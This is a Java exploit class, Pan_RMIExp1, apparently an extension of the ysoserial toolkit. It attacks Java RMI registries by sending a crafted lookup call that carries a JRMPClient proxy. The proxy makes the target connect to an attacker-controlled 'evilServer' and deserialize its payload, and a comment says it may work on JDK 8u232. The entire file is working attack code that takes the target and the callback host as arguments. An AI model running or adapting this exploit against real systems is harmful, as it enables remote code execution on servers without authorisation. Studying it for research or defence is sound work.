package ysoserial.exploit;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.exploit.PanDomain.RemoteStubTmp;

import java.io.IOException;
import java.io.ObjectOutput;
import java.lang.reflect.Proxy;
import java.rmi.MarshalException;
import java.rmi.Remote;
import java.rmi.server.*;

/*
*  may work under jdk8u232_b09
* */
public class Pan_RMIExp1 {
    public static void main(String[] args) throws Exception{
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String evilServer = args[2];
       exp1(host, port, evilServer);
    }

    public static void exp1(String host,int port, String evilServer) throws Exception{
        Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};

        LiveRef liveRef =
            new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                new TCPEndpoint(host, port, null, null),
                false);
        UnicastRef unicastRef = new UnicastRef(liveRef);

        ysoserial.payloads.JRMPClient jrmpClient = new ysoserial.payloads.JRMPClient();
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = jrmpClient.getRemoteObjectInvocationHandler(evilServer);
        Remote r = (Remote) Proxy.newProxyInstance(
            Remote.class.getClassLoader(),
            new Class[]{Remote.class},
            remoteObjectInvocationHandler
        );

        RemoteStub remoteStubTmp = new RemoteStubTmp();
        RemoteCall remoteCall = unicastRef.newCall(remoteStubTmp, operations, 2, 4905912898345647071L);

        try {
            ObjectOutput var3 = remoteCall.getOutputStream();
            var3.writeObject(r);
        } catch (IOException var17) {
            throw new MarshalException("error marshalling arguments", var17);
        }
        unicastRef.invoke(remoteCall);
    }
}
